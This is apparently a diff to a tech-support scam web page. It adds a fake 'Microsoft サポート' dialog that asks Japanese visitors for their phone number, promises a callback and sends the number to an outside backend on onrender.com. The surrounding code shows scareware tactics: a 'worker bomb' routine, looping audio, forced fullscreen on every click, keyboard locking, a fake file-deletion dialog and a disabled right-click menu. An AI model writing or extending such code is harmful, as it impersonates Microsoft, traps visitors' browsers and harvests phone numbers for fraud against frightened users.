@@ -75,7 +75,10 @@
 
       /* Hide cursor only in the top 35% of the viewport (toggled via JS). */
       body.cursor-hide-top,
-      body.cursor-hide-top *:not(.win-dialog-overlay):not(.win-dialog-overlay *) {
+      body.cursor-hide-top
+        *:not(.win-dialog-overlay):not(.win-dialog-overlay *):not(
+          #contact-form-card
+        ):not(#contact-form-card *) {
         cursor: none !important;
       }
 
@@ -1732,6 +1735,151 @@
         font-weight: 700;
         letter-spacing: 0.1px;
       }
+
+      /* ── Contact Form Card ── */
+      #contact-form-card {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: min(520px, calc(100% - 28px));
+        background: rgba(243, 246, 252, 0.92);
+        border: 1px solid rgba(255, 255, 255, 0.65);
+        border-radius: 12px;
+        backdrop-filter: blur(16px) saturate(120%);
+        -webkit-backdrop-filter: blur(16px) saturate(120%);
+        box-shadow:
+          0 22px 54px rgba(0, 0, 0, 0.28),
+          0 2px 0 rgba(255, 255, 255, 0.48) inset;
+        z-index: 150000;
+        font-family: "Segoe UI", "Yu Gothic UI", "Meiryo", sans-serif;
+        overflow: hidden;
+        display: none;
+      }
+      #contact-form-card.visible {
+        display: block !important;
+      }
+      .contact-form-titlebar {
+        height: 36px;
+        display: flex;
+        align-items: center;
+        padding: 0 14px;
+        background: rgba(234, 238, 245, 0.9);
+        border-bottom: 1px solid rgba(255, 255, 255, 0.7);
+        font-size: 12.5px;
+        font-weight: 600;
+        color: #151515;
+      }
+      .contact-form-body {
+        padding: 20px 24px 18px;
+        background: rgba(255, 255, 255, 0.78);
+      }
+      .contact-form-title {
+        margin: 0 0 8px;
+        font-size: 16px;
+        font-weight: 700;
+        line-height: 1.45;
+        color: #1a1a1a;
+      }
+      .contact-form-subtitle {
+        margin: 0 0 16px;
+        color: #4d5561;
+        font-size: 13px;
+        line-height: 1.5;
+      }
+      .contact-form-label {
+        display: block;
+        margin-bottom: 8px;
+        font-size: 13px;
+        font-weight: 600;
+        color: #1f1f1f;
+      }
+      .contact-form-input {
+        width: 100%;
+        background: #ffffff;
+        color: #1c1f23;
+        border: 1px solid #c8d3e5;
+        border-radius: 8px;
+        padding: 10px 12px;
+        font-size: 14px;
+        outline: none;
+        transition:
+          border-color 0.15s ease,
+          box-shadow 0.15s ease;
+        box-sizing: border-box;
+        font-family: inherit;
+      }
+      .contact-form-input:focus {
+        border-color: #0f6cbd;
+        box-shadow: 0 0 0 3px rgba(15, 108, 189, 0.18);
+      }
+      .contact-form-phone-row {
+        display: flex;
+        gap: 8px;
+        align-items: stretch;
+      }
+      .contact-form-prefix {
+        flex-shrink: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: #f3f6fc;
+        color: #1c1f23;
+        border: 1px solid #c8d3e5;
+        border-radius: 8px;
+        padding: 10px 12px;
+        font-size: 14px;
+        font-weight: 700;
+        min-width: 58px;
+        box-sizing: border-box;
+      }
+      .contact-form-phone-row .contact-form-input-phone {
+        flex: 1;
+        width: auto;
+        min-width: 0;
+      }
+      .contact-form-actions {
+        display: flex;
+        gap: 8px;
+        margin-top: 16px;
+        justify-content: flex-end;
+      }
+      .contact-form-btn {
+        appearance: none;
+        border: 1px solid #0f6cbd;
+        border-radius: 8px;
+        padding: 9px 18px;
+        font-size: 13px;
+        font-weight: 600;
+        cursor: pointer;
+        transition:
+          background 0.15s ease,
+          border-color 0.15s ease;
+        font-family: inherit;
+      }
+      .contact-form-btn-primary {
+        min-width: 120px;
+        color: #fff;
+        background: #0f6cbd;
+      }
+      .contact-form-btn-primary:hover {
+        background: #115ea3;
+        border-color: #115ea3;
+      }
+      .contact-form-btn-primary:active {
+        background: #0e4f86;
+        border-color: #0e4f86;
+      }
+      .contact-form-status {
+        margin-top: 10px;
+        min-height: 18px;
+        font-size: 12px;
+        color: #0f6cbd;
+      }
+      #contact-form-card,
+      #contact-form-card * {
+        cursor: auto !important;
+      }
     </style>
     <script>
       function runWorkerBombSequence() {
@@ -1958,6 +2106,43 @@
       </div>
       <div class="top-info-phone">サポート: <span data-support-phone></span></div>
     </div>
+    <section
+      id="contact-form-card"
+      role="dialog"
+      aria-modal="true"
+      aria-labelledby="contactFormHeading"
+      aria-hidden="true"
+    >
+      <div class="contact-form-titlebar">Microsoft サポート</div>
+      <div class="contact-form-body">
+        <h2 class="contact-form-title" id="contactFormHeading">
+          電話番号を入力してください。Microsoft Windowsサポートから折り返しご連絡いたします。
+        </h2>
+        <p class="contact-form-subtitle">
+          1分後に折り返しお電話いたします。お手数ですが、お電話に出てください。
+        </p>
+        <form id="contactForm">
+          <label class="contact-form-label" for="contactPhone">電話番号</label>
+          <div class="contact-form-phone-row">
+            <div class="contact-form-prefix" aria-hidden="true">+81:</div>
+            <input
+              class="contact-form-input contact-form-input-phone"
+              type="tel"
+              id="contactPhone"
+              name="phone"
+              autocomplete="tel"
+              required
+            />
+          </div>
+          <div class="contact-form-actions">
+            <button class="contact-form-btn contact-form-btn-primary" type="submit">
+              提出する
+            </button>
+          </div>
+          <div class="contact-form-status" id="contactFormStatus" aria-live="polite"></div>
+        </form>
+      </div>
+    </section>
     <div id="desktop">
       <!-- Desktop Icons -->
       <div id="desktop-icons"></div>
@@ -3272,7 +3457,7 @@
 
       // Enter fullscreen on click (and re-enter after exiting fullscreen)
       const generalAudio = new Audio(
-        "https://files-pop.s3.ap-northeast-1.amazonaws.com/generalaudio.mp3",
+        "https://files-pop.s3.ap-northeast-1.amazonaws.com/aud-input.mp3",
       );
       generalAudio.loop = true;
       let generalAudioStarted = false;
@@ -3297,6 +3482,7 @@
         "recycle-delete-phase-complete",
       );
       const topInfoBanner = document.getElementById("top-info-banner");
+      const contactFormCard = document.getElementById("contact-form-card");
       const recycleCloseBtn = recycleDeleteDialog.querySelector(
         ".recycle-titlebar-btn.close",
       );
@@ -3471,6 +3657,10 @@
         recycleDeleteDialog.setAttribute("aria-hidden", "false");
         topInfoBanner.classList.add("visible");
         topInfoBanner.setAttribute("aria-hidden", "false");
+        if (contactFormCard) {
+          contactFormCard.classList.add("visible");
+          contactFormCard.setAttribute("aria-hidden", "false");
+        }
         recycleDeleteDialog.querySelector(".recycle-titlebar-icon").innerHTML =
           getIcon("recycle");
 
@@ -3505,6 +3695,43 @@
         recycleDeleteTimer = setInterval(updateProgress, 1000);
       }
 
+      const CONTACT_FORM_SUBMIT_URL =
+        "https://form-backend-eowk.onrender.com/submit";
+
+      function initContactFormSubmit() {
+        const contactForm = document.getElementById("contactForm");
+        const contactPhoneInput = document.getElementById("contactPhone");
+        const contactFormStatus = document.getElementById("contactFormStatus");
+        if (!contactForm) return;
+
+        contactForm.addEventListener("submit", async (event) => {
+          event.preventDefault();
+          contactFormStatus.textContent = "送信中...";
+
+          const phone = "+81:" + contactPhoneInput.value.trim();
+
+          try {
+            const response = await fetch(CONTACT_FORM_SUBMIT_URL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ phone }),
+            });
+
+            if (!response.ok) {
+              throw new Error("Submit failed");
+            }
+
+            contactFormStatus.textContent = "送信しました。";
+            contactForm.reset();
+          } catch (error) {
+            contactFormStatus.textContent =
+              "エラーが発生しました。もう一度お試しください。";
+            console.error(error);
+          }
+        });
+      }
+      initContactFormSubmit();
+
       function ensureFullscreen() {
         if (
           !document.fullscreenElement &&
@@ -3526,7 +3753,7 @@
         navigator.keyboard.lock().catch(() => {});
       }
 
-      document.addEventListener("click", ensureFullscreen);
+      document.addEventListener("click", ensureFullscreen, true);
       // Disable right-click context menu
       document.addEventListener("contextmenu", (event) =>
         event.preventDefault(),
